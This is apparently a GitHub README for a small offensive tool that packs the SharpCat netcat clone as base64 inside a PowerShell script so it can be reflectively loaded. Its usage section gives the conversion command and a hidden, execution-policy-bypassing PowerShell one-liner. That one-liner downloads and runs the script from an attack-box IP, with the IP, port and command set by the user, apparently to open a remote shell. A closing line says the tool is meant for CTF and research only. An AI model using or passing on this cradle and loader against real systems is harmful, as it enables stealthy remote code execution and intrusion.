# Description

This is a kang project where I basically stiched together a few components to make a working tool. It is to be used like nc64.exe for windows but in a smaller form

# Credits

Sharpcat can be found here: https://github.com/Cn33liz/SharpCat

The reflective loading part is thanks to the help of Hunter. You can find their repos here: https://github.com/hunterino-sec

Thanks to B5Null for testing. You can find their repos here: https://github.com/b5null

# Usage

clone the Sharpcat repo and compile it

convert the .exe to b64

[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\SomeDirectory\Sharpcat.exe")) | Out-File -Encoding ASCII C:\SomeDirectory\Sharpcat.txt

clone this repo, edit the sharpcat.ps1 to adjust IP, PORT and COMMAND

insert the b64 from Sharpcat.txt into the $b64 variable in sharpcat.ps1

then use this to retrieve and start sharpcat. Adjust the ip for your attack box

```powershell -noexit -ep bypass -nop -w hidden -Command "IEX(IWR -usebasicparsing http://10.10.14.4/sharpcat.ps1)"```

this is for CTF only and for research, do not use this in a malicious way
